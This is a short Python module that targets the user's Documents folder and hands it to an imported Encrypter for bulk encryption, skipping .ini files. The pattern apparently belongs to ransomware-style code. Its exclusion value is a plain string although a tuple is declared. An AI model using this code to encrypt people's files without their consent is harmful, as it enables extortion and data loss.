from encrypter import Encrypter
import os


class Encrypt:
    _path : str
    _exclude_extensions : tuple

    def __init__(self) -> None:
        self._path = os.path.expanduser( '~' ).replace('\\', '//') + '//Documents'
        self._exclude_extensions = ('.ini')


    def process(self, encryption_key):
        encrypter = Encrypter(encryption_key)
        return encrypter.encrypt(self._path, self._exclude_extensions)
    